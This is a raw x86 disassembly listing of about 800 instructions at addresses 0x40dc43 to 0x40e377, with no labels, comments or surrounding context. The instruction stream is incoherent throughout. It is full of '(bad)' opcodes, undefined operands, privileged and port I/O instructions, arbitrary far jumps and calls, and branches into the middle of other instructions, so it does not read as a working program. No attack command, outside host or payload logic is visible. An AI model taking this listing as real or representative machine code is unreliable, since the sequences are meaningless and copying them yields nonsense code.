  40dc43:	add    BYTE PTR [eax],bl
  40dc45:	jb     0x40dbca
  40dc47:	mov    dl,0xf7
  40dc49:	inc    edx
  40dc4a:	xchg   esi,eax
  40dc4b:	pop    ss
  40dc4c:	pop    edi
  40dc4d:	mov    ecx,0x4e7ddc6b
  40dc52:	pop    ds
  40dc53:	sbb    eax,0x4d6eede8
  40dc58:	jae    0x40dcb7
  40dc5a:	enter  0xd544,0x3
  40dc5e:	adc    bl,bh
  40dc60:	ret    
  40dc61:	arpl   WORD PTR [edx],sp
  40dc63:	retf   
  40dc64:	sub    eax,DWORD PTR [esi-0x598feb2f]
  40dc6a:	ret    
  40dc6b:	imul   ecx,DWORD PTR [ebp-0x578c5989],0x971b6200
  40dc75:	aad    0xa5
  40dc77:	sbb    DWORD PTR gs:[esi+0x2e8ef023],eax
  40dc7e:	icebp  
  40dc7f:	lods   eax,DWORD PTR ds:[esi]
  40dc80:	mov    ds:0xaa84bff8,eax
  40dc85:	nop
  40dc86:	ja     0x40dcf8
  40dc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc89:	xor    BYTE PTR [edx-0x76],dl
  40dc8c:	std    
  40dc8d:	add    BYTE PTR [ecx],al
  40dc8f:	jmp    0x40dc28
  40dc91:	(bad)  
  40dc92:	push   ecx
  40dc93:	sti    
  40dc94:	push   ebp
  40dc95:	xchg   esp,eax
  40dc96:	inc    ebp
  40dc97:	inc    edi
  40dc98:	adc    al,0x16
  40dc9a:	push   ebx
  40dc9b:	lods   eax,DWORD PTR ds:[esi]
  40dc9c:	retf   0x6ccd
  40dc9f:	xchg   edx,eax
  40dca0:	mov    bh,cl
  40dca2:	loopne 0x40dca1
  40dca4:	ins    DWORD PTR es:[edi],dx
  40dca5:	mov    dh,0xf0
  40dca7:	imul   ebp,DWORD PTR [edx+0x3c],0xe48f1a5c
  40dcae:	stos   DWORD PTR es:[edi],eax
  40dcaf:	inc    esi
  40dcb0:	pop    edi
  40dcb1:	xor    ebx,ebx
  40dcb3:	xlat   BYTE PTR ds:[ebx]
  40dcb4:	sbb    eax,0xbd591341
  40dcb9:	pop    DWORD PTR [eax+0x18]
  40dcbc:	mov    dh,dh
  40dcbe:	sbb    al,0xbb
  40dcc0:	jecxz  0x40dd3d
  40dcc2:	jns    0x40dcdd
  40dcc4:	add    eax,0xee0ac6e2
  40dcc9:	test   eax,0xd14eff35
  40dcce:	cmp    BYTE PTR [edx+0x298ab4c2],cl
  40dcd4:	stos   BYTE PTR es:[edi],al
  40dcd5:	ror    bh,cl
  40dcd7:	cmp    eax,0x4f1e9ee6
  40dcdc:	push   esi
  40dcdd:	sti    
  40dcde:	lock pop es
  40dce0:	rcl    eax,0xfe
  40dce3:	mov    DWORD PTR [ebp-0x7eaf9203],ecx
  40dce9:	mov    ch,0x65
  40dceb:	jl     0x40dc7c
  40dced:	or     edx,DWORD PTR [ecx]
  40dcef:	pop    es
  40dcf0:	or     eax,0x625f3125
  40dcf5:	cmc    
  40dcf6:	xor    DWORD PTR ds:0xb058c78c,0x5a
  40dcfd:	and    al,0xb6
  40dcff:	jmp    0xeaba:0x49e92838
  40dd06:	imul   esi,DWORD PTR [ecx+0x29],0x6e96a9d4
  40dd0d:	pop    eax
  40dd0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd0f:	fcom   st(1)
  40dd11:	hlt    
  40dd12:	mov    edi,0x4ad73983
  40dd17:	(bad)
  40dd1a:	mov    dh,0xe2
  40dd1c:	push   ebx
  40dd1d:	xchg   edi,eax
  40dd1e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40dd20:	pop    esi
  40dd21:	inc    eax
  40dd22:	pushf  
  40dd23:	ret    
  40dd24:	pop    edx
  40dd25:	sub    DWORD PTR [edi-0x54511d1b],0x63
  40dd2c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40dd2e:	pop    edx
  40dd2f:	jmp    0x40dd3f
  40dd31:	outs   dx,DWORD PTR ds:[esi]
  40dd32:	jl     0x40dd02
  40dd34:	add    edi,DWORD PTR [eax]
  40dd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd37:	repnz push ds
  40dd39:	les    ebx,FWORD PTR [edi]
  40dd3b:	out    dx,eax
  40dd3c:	sbb    WORD PTR [ebp+0x46],si
  40dd40:	cmp    esp,DWORD PTR [ecx]
  40dd42:	lds    edx,FWORD PTR [ecx+esi*2-0xd]
  40dd46:	inc    eax
  40dd47:	fbstp  TBYTE PTR [edi]
  40dd49:	push   edx
  40dd4a:	push   ebp
  40dd4b:	jge    0x40dce1
  40dd4d:	sub    ah,ch
  40dd4f:	int    0xf4
  40dd51:	sbb    ch,BYTE PTR [ebx]
  40dd53:	ss jle 0x40dd9e
  40dd56:	jno    0x40dcfc
  40dd58:	xchg   esp,eax
  40dd59:	push   ds
  40dd5a:	cwde   
  40dd5b:	sbb    BYTE PTR [edi-0x335f3d0f],dh
  40dd61:	jbe    0x40dda9
  40dd63:	outs   dx,DWORD PTR ds:[esi]
  40dd64:	mov    cl,0xb4
  40dd66:	xchg   esi,eax
  40dd67:	sub    cl,BYTE PTR [ecx]
  40dd69:	rdtsc  
  40dd6b:	fnstsw WORD PTR [ebx]
  40dd6d:	sub    bl,bl
  40dd6f:	test   eax,0x59450723
  40dd74:	lods   eax,DWORD PTR ds:[esi]
  40dd75:	mov    esi,0x35e8572a
  40dd7a:	and    DWORD PTR [edi],eax
  40dd7c:	xchg   edi,eax
  40dd7d:	sbb    dh,BYTE PTR [ecx-0x23db0262]
  40dd83:	mov    edi,0x36a4f917
  40dd88:	mov    WORD PTR [eax-0x4cf68f47],?
  40dd8e:	mov    eax,0x13e9d071
  40dd93:	call   DWORD PTR [esi-0x12]
  40dd96:	test   BYTE PTR [ebx+0x31],ch
  40dd99:	sub    al,0x22
  40dd9b:	(bad)  
  40dd9d:	inc    ebx
  40dd9e:	dec    ecx
  40dd9f:	mov    dl,bh
  40dda1:	lods   eax,DWORD PTR ds:[esi]
  40dda2:	sbb    al,0x80
  40dda4:	leave  
  40dda5:	ins    BYTE PTR es:[edi],dx
  40dda6:	or     ebp,0xb59b806f
  40ddac:	std    
  40ddad:	sbb    eax,0xd2b705d
  40ddb2:	or     dh,bl
  40ddb4:	mov    ebp,0x6ed07fde
  40ddb9:	mov    DWORD PTR [edi+0x4e200197],esp
  40ddbf:	and    ch,BYTE PTR [eax-0x4]
  40ddc2:	mov    bh,BYTE PTR ds:0x109fd4d4
  40ddc8:	aam    0xff
  40ddca:	cmp    eax,DWORD PTR [esi-0x40a6689a]
  40ddd0:	test   ebx,edx
  40ddd2:	mov    edx,0x3c16c141
  40ddd7:	push   ss
  40ddd8:	sub    al,ah
  40ddda:	mov    eax,ds:0xb65de2f5
  40dddf:	out    0xce,eax
  40dde1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde2:	jp     0x40dde5
  40dde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde5:	ror    DWORD PTR [ecx],cl
  40dde7:	(bad)  
  40dde8:	jns    0x40dde2
  40ddea:	cmp    DWORD PTR [ebp-0x1b],ebx
  40dded:	pop    ds
  40ddee:	sub    eax,0x53360f87
  40ddf3:	lds    edx,FWORD PTR [eax+edi*2-0x3e]
  40ddf7:	ror    DWORD PTR [edx],1
  40ddf9:	xor    ah,bl
  40ddfb:	fld    QWORD PTR [edi+esi*8+0x40]
  40ddff:	mov    ss,edx
  40de01:	inc    edx
  40de02:	pop    ebp
  40de03:	mov    cl,0x99
  40de05:	mov    al,0xae
  40de07:	lods   eax,DWORD PTR ds:[esi]
  40de08:	lahf   
  40de09:	push   cs
  40de0a:	add    DWORD PTR [ebp-0x679b839f],ebx
  40de10:	outs   dx,DWORD PTR ds:[esi]
  40de11:	rcr    DWORD PTR [edi+0x62],0x7b
  40de15:	imul   esp,DWORD PTR [esi-0x3b],0x2b
  40de19:	cmp    esp,eax
  40de1b:	ret    
  40de1c:	pop    ebp
  40de1d:	in     al,0x7e
  40de1f:	out    dx,eax
  40de20:	das    
  40de21:	fwait
  40de22:	scas   eax,DWORD PTR es:[edi]
  40de23:	ror    BYTE PTR [edx+0x182a3a26],0xae
  40de2a:	push   ebx
  40de2b:	rcl    DWORD PTR [esi+0x18],1
  40de2e:	jp     0x40ddc8
  40de30:	sbb    eax,esp
  40de32:	mov    esp,0x31f88944
  40de37:	push   edx
  40de38:	xchg   ecx,eax
  40de39:	push   0x4719330e
  40de3e:	fwait
  40de3f:	int3   
  40de40:	rol    edi,0x46
  40de43:	inc    edx
  40de44:	cmp    DWORD PTR [ebp-0x738679e1],esp
  40de4a:	push   0xfffffffe
  40de4c:	mov    BYTE PTR [edx-0x25],cl
  40de4f:	(bad)  
  40de50:	push   edx
  40de51:	xor    BYTE PTR [eax],ch
  40de53:	push   ds
  40de54:	dec    edx
  40de55:	adc    al,0xc4
  40de57:	mov    di,0xbc28
  40de5b:	push   ebp
  40de5c:	int    0x43
  40de5e:	cmp    DWORD PTR [ecx+0x33428fa1],ebx
  40de64:	pop    ss
  40de65:	add    eax,0x532db1e5
  40de6a:	pop    ss
  40de6b:	mov    edx,edi
  40de6d:	outs   dx,BYTE PTR ds:[esi]
  40de6e:	icebp  
  40de6f:	cmp    DWORD PTR [ebp-0x6c3a3307],eax
  40de75:	fadd   st(2),st
  40de77:	icebp  
  40de78:	inc    esp
  40de79:	cmp    dh,BYTE PTR [esi+0x365a4aab]
  40de7f:	push   ebx
  40de80:	lock sub DWORD PTR [edx-0x66],0xffffff8d
  40de85:	in     eax,dx
  40de86:	mov    BYTE PTR [edi+0x12],ch
  40de89:	sahf   
  40de8a:	(bad)  
  40de8b:	in     eax,dx
  40de8c:	push   ebp
  40de8d:	pushf  
  40de8e:	pop    ebp
  40de8f:	popf   
  40de90:	cmc    
  40de91:	add    edi,DWORD PTR [ebx]
  40de93:	dec    ebx
  40de94:	rcr    bl,1
  40de96:	and    DWORD PTR [ebp+0x4f],esi
  40de99:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de9b:	loop   0x40deda
  40de9d:	xor    DWORD PTR [esi+0x1e846ab0],ebx
  40dea3:	sub    DWORD PTR [ecx+0x3],ecx
  40dea6:	ss cld 
  40dea8:	cdq    
  40dea9:	daa    
  40deaa:	out    dx,al
  40deab:	fwait
  40deac:	inc    esp
  40dead:	inc    esp
  40deae:	enter  0xef52,0x29
  40deb2:	adc    DWORD PTR gs:[ecx-0x32],esi
  40deb6:	push   0x22ab5cfe
  40debb:	inc    esp
  40debc:	mov    ch,0x87
  40debe:	adc    DWORD PTR [esi+edi*1-0x5],ecx
  40dec2:	jo     0x40de45
  40dec4:	or     BYTE PTR [ebx-0x3f7e3d2b],cl
  40deca:	cmp    ebx,eax
  40decc:	bound  ecx,QWORD PTR [ebx]
  40dece:	ja     0x40de96
  40ded0:	ins    BYTE PTR es:[edi],dx
  40ded1:	shl    esp,cl
  40ded3:	je     0x40de74
  40ded5:	or     al,0x5
  40ded7:	iret   
  40ded8:	enter  0x4f6d,0x34
  40dedc:	cwde   
  40dedd:	mov    DWORD PTR [edx-0x64],ecx
  40dee0:	(bad)  
  40dee2:	(bad)  
  40dee3:	cli    
  40dee4:	sbb    BYTE PTR [edx],bl
  40dee6:	or     BYTE PTR [esi-0x6a],al
  40dee9:	outs   dx,BYTE PTR ds:[esi]
  40deea:	inc    ebp
  40deeb:	add    BYTE PTR [ecx-0x63],cl
  40deee:	pusha  
  40deef:	fwait
  40def0:	nop
  40def1:	inc    ecx
  40def2:	push   edi
  40def3:	(bad)  
  40def4:	(bad)  
  40def5:	and    dh,ah
  40def7:	les    edi,FWORD PTR [esp+ebx*8+0x3355fc08]
  40defe:	mov    DWORD PTR [ebx+0x7a],edi
  40df01:	pop    esp
  40df02:	pop    ebx
  40df03:	(bad)  
  40df04:	test   eax,0xe3d7721d
  40df09:	iret   
  40df0a:	int    0x61
  40df0c:	dec    eax
  40df0d:	xchg   esi,eax
  40df0e:	retf   0xa5e2
  40df11:	stos   BYTE PTR es:[edi],al
  40df12:	stos   BYTE PTR es:[edi],al
  40df13:	pop    ecx
  40df14:	jecxz  0x40df93
  40df16:	popa   
  40df17:	mov    ch,ah
  40df19:	and    DWORD PTR [ebx],esi
  40df1b:	aaa    
  40df1c:	shl    BYTE PTR [ebp-0x4a],cl
  40df1f:	retf   
  40df20:	cmc    
  40df21:	mul    bl
  40df23:	xor    eax,0xeb2d34b5
  40df28:	jmp    0x40df59
  40df2a:	xchg   ebx,eax
  40df2b:	mov    ecx,DWORD PTR [ecx+0x4f774af3]
  40df31:	sub    BYTE PTR [ebx-0xe],dh
  40df34:	std    
  40df35:	scas   al,BYTE PTR es:[edi]
  40df36:	out    0x67,al
  40df38:	cmp    ebp,0xffffff93
  40df3b:	jge    0x40df8c
  40df3d:	idiv   BYTE PTR [edi+eiz*4+0x1]
  40df41:	and    al,0x4c
  40df43:	pop    eax
  40df44:	fist   WORD PTR [ebp+0x17]
  40df47:	in     eax,0xc5
  40df49:	fsubr  DWORD PTR [edx]
  40df4b:	dec    ebx
  40df4c:	sub    DWORD PTR [ebx],edi
  40df4e:	ficom  DWORD PTR [esi-0x2e2e1e3]
  40df54:	dec    edi
  40df55:	hlt    
  40df56:	cmp    al,0x93
  40df58:	js     0x40df04
  40df5a:	xor    bl,BYTE PTR [esp+edx*8+0x58693cd5]
  40df61:	dec    ebx
  40df62:	mov    eax,ds:0xd2cddf56
  40df67:	rol    DWORD PTR [esi-0x5937a7ad],1
  40df6d:	dec    DWORD PTR [ecx+0x2380b111]
  40df73:	sub    eax,0x6946649d
  40df78:	in     al,dx
  40df79:	stos   BYTE PTR es:[edi],al
  40df7a:	nop
  40df7b:	push   esp
  40df7c:	nop
  40df7d:	(bad)  
  40df7f:	push   ecx
  40df80:	jb     0x40df52
  40df82:	in     eax,0x70
  40df84:	stos   BYTE PTR es:[edi],al
  40df85:	bound  edx,QWORD PTR [esi+0x8ee0eda]
  40df8b:	mov    ds:0x32bfbefe,eax
  40df90:	push   0x82df1403
  40df95:	mov    DWORD PTR [esi-0x5008a178],edx
  40df9b:	xor    eax,0xc8426311
  40dfa0:	rcr    BYTE PTR [esp+eax*4],0x6a
  40dfa4:	or     ah,dh
  40dfa6:	imul   eax,DWORD PTR [eax],0xffffffc5
  40dfa9:	sub    eax,0x490fff14
  40dfae:	lahf   
  40dfaf:	out    dx,eax
  40dfb0:	rcl    DWORD PTR [ecx+0x3e29d3e6],cl
  40dfb6:	xor    DWORD PTR [ecx+eax*2-0x3e8b0837],eax
  40dfbd:	cmp    ebp,DWORD PTR [edi-0x1f]
  40dfc0:	(bad)
  40dfc3:	std    
  40dfc4:	dec    ebx
  40dfc5:	ficomp DWORD PTR [edi+0x5d4d470f]
  40dfcb:	mov    ds:0xead7f3b1,eax
  40dfd0:	jecxz  0x40df8f
  40dfd2:	mov    ds:0xd6deec9e,al
  40dfd7:	dec    ecx
  40dfd8:	outs   dx,DWORD PTR ds:[esi]
  40dfd9:	nop
  40dfda:	jns    0x40e017
  40dfdc:	sub    eax,DWORD PTR [eax]
  40dfde:	fadd   DWORD PTR [ebx]
  40dfe0:	into   
  40dfe1:	xchg   ebx,eax
  40dfe2:	test   ecx,ebp
  40dfe4:	pop    ds
  40dfe5:	fcomi  st,st(7)
  40dfe7:	dec    edx
  40dfe8:	clc    
  40dfe9:	jge    0x40df7e
  40dfeb:	or     al,0x5e
  40dfed:	popf   
  40dfee:	addr16 fnstsw ax
  40dff1:	push   edx
  40dff2:	jmp    DWORD PTR [edx-0x675059b6]
  40dff8:	sahf   
  40dff9:	sub    bl,dh
  40dffb:	test   BYTE PTR [edi-0x47],bh
  40dffe:	sti    
  40dfff:	test   DWORD PTR [esi-0x10],esi
  40e002:	xchg   ecx,eax
  40e003:	and    ch,bl
  40e005:	fidivr WORD PTR [edx+0x62]
  40e008:	dec    ebp
  40e009:	pop    es
  40e00a:	and    cl,ch
  40e00c:	ins    DWORD PTR es:[edi],dx
  40e00d:	es int3 
  40e00f:	cmp    eax,0x23cdd743
  40e014:	mov    edi,0x195169e3
  40e019:	mov    bl,0xe1
  40e01b:	sbb    ebp,edi
  40e01d:	inc    edi
  40e01e:	(bad)  [ecx+0x58536962]
  40e024:	mov    ecx,0xccdfe2c6
  40e029:	and    DWORD PTR gs:[ecx+edx*1],0x8e4214ad
  40e031:	mov    ds,WORD PTR [edx]
  40e033:	cmc    
  40e034:	xchg   edi,eax
  40e035:	sub    esp,edx
  40e037:	cli    
  40e038:	data16 jg 0x40dff6
  40e03b:	shl    BYTE PTR [eax+0x40],0x72
  40e03f:	add    al,0x5b
  40e041:	ja     0x40e043
  40e043:	rol    DWORD PTR [ebx+0x179a1feb],1
  40e049:	mov    cl,0x4d
  40e04b:	xchg   edi,eax
  40e04c:	ins    BYTE PTR es:[edi],dx
  40e04d:	mov    ecx,0x33775bc9
  40e052:	in     eax,dx
  40e053:	int3   
  40e054:	fdivr  QWORD PTR [ebx-0x33290f86]
  40e05a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e05b:	dec    esi
  40e05c:	and    DWORD PTR [edi],0x7eb68d76
  40e062:	cmp    DWORD PTR [eax-0x5ba3f7db],edx
  40e068:	adc    al,0x7f
  40e06a:	lods   eax,DWORD PTR ds:[esi]
  40e06b:	sbb    BYTE PTR [eax+0xc],bl
  40e06e:	and    al,0xa0
  40e070:	jle    0x40e08d
  40e072:	(bad)  
  40e073:	je     0x40e079
  40e075:	pop    es
  40e076:	push   ss
  40e077:	outs   dx,BYTE PTR ds:[esi]
  40e078:	js     0x40e0d2
  40e07a:	push   edi
  40e07b:	push   ecx
  40e07c:	push   esi
  40e07d:	nop    DWORD PTR [esi-0x3be900d3]
  40e084:	stc    
  40e085:	xchg   edi,eax
  40e086:	in     eax,dx
  40e087:	nop
  40e088:	mov    edi,DWORD PTR [ebx]
  40e08a:	aam    0xa8
  40e08c:	sbb    al,0xae
  40e08e:	cmp    DWORD PTR [edx],0x1e9155ea
  40e094:	(bad)
  40e097:	sub    al,0x1a
  40e099:	enter  0xf8c9,0xab
  40e09d:	shl    DWORD PTR [edx],0x67
  40e0a0:	and    al,BYTE PTR [ebx]
  40e0a2:	mov    bh,0xcf
  40e0a4:	cmc    
  40e0a5:	scas   al,BYTE PTR es:[edi]
  40e0a6:	mov    ah,0xaa
  40e0a8:	mov    ch,0x80
  40e0aa:	mov    ebp,0x1e52cac2
  40e0af:	lods   al,BYTE PTR ds:[esi]
  40e0b0:	jmp    0x40e100
  40e0b2:	cmp    eax,0x43248fd8
  40e0b7:	add    ch,BYTE PTR [esi+0x47c252]
  40e0bd:	sti    
  40e0be:	cli    
  40e0bf:	fist   DWORD PTR [esi+ebx*4+0x7e879f02]
  40e0c6:	mov    bh,0x87
  40e0c8:	scas   eax,DWORD PTR es:[edi]
  40e0c9:	(bad)  
  40e0cb:	xor    DWORD PTR [edi-0x7f],eax
  40e0ce:	add    esi,eax
  40e0d0:	pushf  
  40e0d1:	aas    
  40e0d2:	add    BYTE PTR [edx+ebx*1],cl
  40e0d5:	sbb    DWORD PTR [eax+0x70],esi
  40e0d8:	adc    al,0x1e
  40e0da:	out    dx,al
  40e0db:	jg     0x40e155
  40e0dd:	inc    edi
  40e0de:	retf   
  40e0df:	aad    0x27
  40e0e1:	jp     0x40e0aa
  40e0e3:	popf   
  40e0e4:	scas   eax,DWORD PTR es:[edi]
  40e0e5:	cmp    edx,DWORD PTR cs:[eax]
  40e0e8:	ror    bl,0x5e
  40e0eb:	loop   0x40e13a
  40e0ed:	and    DWORD PTR [ecx+ecx*8],ebx
  40e0f0:	adc    dh,BYTE PTR [eax-0x29ab482d]
  40e0f6:	fidiv  DWORD PTR [ebx+0x26ed322a]
  40e0fc:	mov    ds:0x96a8f830,eax
  40e101:	ret    
  40e102:	iret   
  40e103:	sbb    ch,0xe8
  40e106:	(bad)  
  40e107:	sbb    esi,DWORD PTR [esi]
  40e109:	jb     0x40e0ac
  40e10b:	cli    
  40e10c:	sub    eax,0x7ef10579
  40e111:	cmp    DWORD PTR ds:0x2d1b4e5b,edx
  40e117:	or     al,0x55
  40e119:	stos   BYTE PTR es:[edi],al
  40e11a:	fsub   QWORD PTR [ebx-0x2e]
  40e11d:	mov    ch,0x3
  40e11f:	push   eax
  40e120:	mov    esp,0x80f94dee
  40e125:	mov    ch,0xb9
  40e127:	xor    BYTE PTR [ecx-0x28],dh
  40e12a:	arpl   WORD PTR [edi],dx
  40e12c:	inc    DWORD PTR [edi+0x75]
  40e12f:	push   edx
  40e130:	inc    eax
  40e131:	xor    dl,BYTE PTR [edx+0x4a]
  40e134:	pop    eax
  40e135:	xchg   DWORD PTR [ebp+0x46],esp
  40e138:	jb     0x40e162
  40e13a:	or     bl,BYTE PTR [ebx]
  40e13c:	add    ebp,DWORD PTR [ebp-0x72ff4261]
  40e142:	aas    
  40e143:	cmp    eax,0x6eee54a5
  40e148:	xchg   DWORD PTR [si-0x5f],eax
  40e14c:	xchg   edx,eax
  40e14d:	inc    edx
  40e14e:	inc    ebx
  40e14f:	push   ss
  40e150:	out    dx,eax
  40e151:	ret    0x4a21
  40e154:	repz adc ecx,DWORD PTR [ecx-0x144bff54]
  40e15b:	lock jbe 0x40e120
  40e15e:	adc    al,0x3c
  40e160:	dec    ebx
  40e161:	fmul   DWORD PTR [edx+ebx*2]
  40e164:	xor    eax,0xce9b5da6
  40e169:	push   ss
  40e16a:	sar    DWORD PTR [ebx],cl
  40e16c:	xchg   esp,eax
  40e16d:	ja     0x40e0fe
  40e16f:	and    al,0xb3
  40e171:	ins    DWORD PTR es:[edi],dx
  40e172:	adc    al,0x7d
  40e174:	jg     0x40e10c
  40e176:	cmp    eax,eax
  40e178:	les    edi,FWORD PTR [ebx-0x68]
  40e17b:	jl     0x40e183
  40e17d:	(bad)  
  40e17e:	and    eax,0x4181063f
  40e183:	loopne 0x40e1f7
  40e185:	dec    ecx
  40e186:	in     al,0x9c
  40e188:	jecxz  0x40e163
  40e18a:	jbe    0x40e1ce
  40e18c:	mov    ds:0x75ba812a,eax
  40e191:	push   0xffffffb6
  40e193:	mov    esi,0x22876a2a
  40e198:	mov    dl,0x20
  40e19a:	mov    esi,0x8ca31f93
  40e19f:	sub    BYTE PTR [ecx+0x333e2d24],cl
  40e1a5:	cmc    
  40e1a6:	jne    0x40e1b6
  40e1a8:	(bad)  
  40e1a9:	fldcw  WORD PTR [edi+0x4b]
  40e1ac:	ror    edx,cl
  40e1ae:	lahf   
  40e1af:	aam    0x9
  40e1b1:	sub    eax,0x30a559d3
  40e1b6:	push   esi
  40e1b7:	icebp  
  40e1b8:	mov    eax,0xefb867f8
  40e1bd:	adc    dh,BYTE PTR [ecx+0x6]
  40e1c0:	cld    
  40e1c1:	dec    eax
  40e1c2:	mov    ecx,0xf0e5bbd2
  40e1c7:	jecxz  0x40e206
  40e1c9:	xchg   esi,eax
  40e1ca:	jmp    0x40e227
  40e1cc:	xor    eax,DWORD PTR [ebx-0x6f]
  40e1cf:	jne    0x40e1af
  40e1d1:	or     edi,DWORD PTR [ebx-0x34]
  40e1d4:	sti    
  40e1d5:	rcl    DWORD PTR [edi+0x19577ffb],1
  40e1db:	adc    dl,ch
  40e1dd:	pop    ecx
  40e1de:	mov    bl,0xd5
  40e1e0:	or     DWORD PTR [edx],edx
  40e1e2:	push   ds
  40e1e3:	xor    ecx,DWORD PTR [edi+0x259083e4]
  40e1e9:	dec    esp
  40e1ea:	jne    0x40e222
  40e1ec:	arpl   ax,bx
  40e1ee:	mov    eax,ds:0x2591f708
  40e1f3:	xchg   ebx,eax
  40e1f4:	xchg   esp,eax
  40e1f5:	inc    ebp
  40e1f6:	arpl   WORD PTR [eax-0x5d],dx
  40e1f9:	cmc    
  40e1fa:	xchg   esi,eax
  40e1fb:	inc    esi
  40e1fc:	cdq    
  40e1fd:	es ins DWORD PTR es:[edi],dx
  40e1ff:	inc    esi
  40e200:	pop    ecx
  40e201:	jne    0x40e1f2
  40e203:	(bad)  
  40e204:	out    0x27,al
  40e206:	cmp    al,0x47
  40e208:	pop    esi
  40e209:	push   0xdb2cc68b
  40e20e:	inc    edi
  40e20f:	add    DWORD PTR [edi+0x2e34ade0],eax
  40e215:	push   ecx
  40e216:	ret    
  40e217:	and    ebp,DWORD PTR ss:[edx+esi*2]
  40e21b:	push   eax
  40e21c:	push   ss
  40e21d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e21e:	xchg   DWORD PTR [ebp+0x33df542f],esi
  40e224:	push   esi
  40e225:	popa   
  40e226:	test   BYTE PTR [ecx],dh
  40e228:	aam    0xb5
  40e22a:	inc    ecx
  40e22b:	pop    ss
  40e22c:	in     al,dx
  40e22d:	popf   
  40e22e:	adc    DWORD PTR [esp+eax*1],edx
  40e231:	push   edx
  40e232:	aam    0xde
  40e234:	cld    
  40e235:	inc    edx
  40e236:	and    dl,BYTE PTR [esp+esi*2]
  40e239:	retf   
  40e23a:	cmp    ecx,DWORD PTR [edx+eax*1-0x21]
  40e23e:	in     eax,0x83
  40e240:	scas   eax,DWORD PTR es:[edi]
  40e241:	ror    DWORD PTR [edi+0x1a3fecdc],0x84
  40e248:	xor    ebp,eax
  40e24a:	sbb    eax,0x2a6419dc
  40e24f:	sbb    DWORD PTR [eax-0xab3c88c],0xfffffff9
  40e256:	xor    BYTE PTR [ebx],0x71
  40e259:	pop    ds
  40e25a:	jbe    0x40e286
  40e25c:	push   ss
  40e25d:	stc    
  40e25e:	pop    ds
  40e25f:	or     DWORD PTR [edx-0x74f17f3c],ebx
  40e265:	push   cs
  40e266:	out    dx,eax
  40e267:	(bad)  
  40e268:	dec    eax
  40e269:	jbe    0x40e29f
  40e26b:	sub    cl,cl
  40e26d:	(bad)  
  40e26e:	shr    BYTE PTR [edx],1
  40e270:	sub    ah,BYTE PTR [esi-0x34]
  40e273:	call   DWORD PTR [ecx+0x21]
  40e276:	mov    dh,0xa5
  40e278:	int    0xca
  40e27a:	ret    0xe59
  40e27d:	out    0xf1,al
  40e27f:	add    eax,0x2aec46a6
  40e284:	daa    
  40e285:	(bad)  
  40e287:	inc    ecx
  40e288:	(bad)  
  40e28a:	xchg   ah,bl
  40e28c:	(bad)  
  40e28d:	(bad)  
  40e28e:	pop    eax
  40e28f:	ja     0x40e29c
  40e291:	sub    esi,edx
  40e293:	sbb    bh,ah
  40e295:	push   ebx
  40e296:	push   eax
  40e297:	and    esp,0xa0c5652
  40e29d:	mov    fs,ebx
  40e29f:	ins    BYTE PTR es:[edi],dx
  40e2a0:	add    BYTE PTR [ecx+0x40],bl
  40e2a3:	cdq    
  40e2a4:	cmp    al,BYTE PTR [ebp+eiz*1-0x7]
  40e2a8:	pop    ebp
  40e2a9:	inc    edx
  40e2aa:	push   0x1037461f
  40e2af:	push   ebp
  40e2b0:	shr    ah,1
  40e2b2:	and    BYTE PTR [ebx+0x59aabc51],ch
  40e2b8:	repnz add bl,dh
  40e2bb:	add    ah,BYTE PTR [ebx]
  40e2bd:	xor    cl,BYTE PTR [edx+0xa8710fe]
  40e2c3:	ret    0xd8b1
  40e2c6:	loopne 0x40e25e
  40e2c8:	fistp  DWORD PTR [ecx]
  40e2ca:	pusha  
  40e2cb:	mov    eax,?
  40e2cd:	mov    al,ds:0xcd834c27
  40e2d2:	push   edx
  40e2d3:	js     0x40e26a
  40e2d5:	sbb    BYTE PTR [esi],0xc8
  40e2d8:	mov    eax,ds:0xbf1b90c5
  40e2dd:	ret    
  40e2de:	call   0x56a7:0x83d9b22f
  40e2e5:	pop    esp
  40e2e6:	xchg   ebx,eax
  40e2e7:	mov    ecx,0x57a44f09
  40e2ec:	call   0x2b42:0x3d605e8f
  40e2f3:	rol    esi,0x97
  40e2f6:	mov    eax,0x4c6c6d59
  40e2fb:	imul   eax,DWORD PTR [edx],0x4f
  40e2fe:	aad    0xf5
  40e300:	scas   eax,DWORD PTR es:[edi]
  40e301:	shr    bh,1
  40e303:	push   ss
  40e304:	inc    eax
  40e305:	add    DWORD PTR [esi-0x791927d1],0xfffffff3
  40e30c:	pop    ebp
  40e30d:	mov    esp,0x9d602d2f
  40e312:	mov    cs,WORD PTR [eax]
  40e314:	fsubrp st(1),st
  40e316:	mov    al,0x61
  40e318:	retf   
  40e319:	aam    0xc3
  40e31b:	test   ch,al
  40e31d:	outs   dx,BYTE PTR ds:[esi]
  40e31e:	clc    
  40e31f:	cwde   
  40e320:	pop    ecx
  40e321:	popf   
  40e322:	lock cmp BYTE PTR ds:0x5d77212b,ch
  40e329:	xchg   ecx,eax
  40e32a:	jecxz  0x40e2af
  40e32c:	xlat   BYTE PTR es:[ebx]
  40e32e:	xchg   BYTE PTR [ebx-0x4ec34b60],cl
  40e334:	mov    ds:0xcc155d42,eax
  40e339:	(bad)  
  40e33a:	mov    eax,ds:0x74a268bb
  40e33f:	call   0xaccdf879
  40e344:	aas    
  40e345:	mov    edi,0x8bee31e1
  40e34a:	jbe    0x40e2f4
  40e34c:	in     al,dx
  40e34d:	mov    edi,0x6348dcf7
  40e352:	jno    0x40e3ad
  40e354:	push   ss
  40e355:	xor    al,0xaa
  40e357:	(bad)
  40e35a:	scas   eax,DWORD PTR es:[edi]
  40e35b:	mov    ds:0x26350aea,al
  40e360:	add    ecx,esp
  40e362:	add    esp,DWORD PTR [eax+0x4249a8fe]
  40e368:	pop    ecx
  40e369:	aaa    
  40e36a:	test   eax,0x6661610
  40e36f:	jns    0x40e3b7
  40e371:	cmp    al,bh
  40e373:	pop    edx
  40e374:	and    edx,DWORD PTR [eax+0x3b]
  40e377:	inc    esi
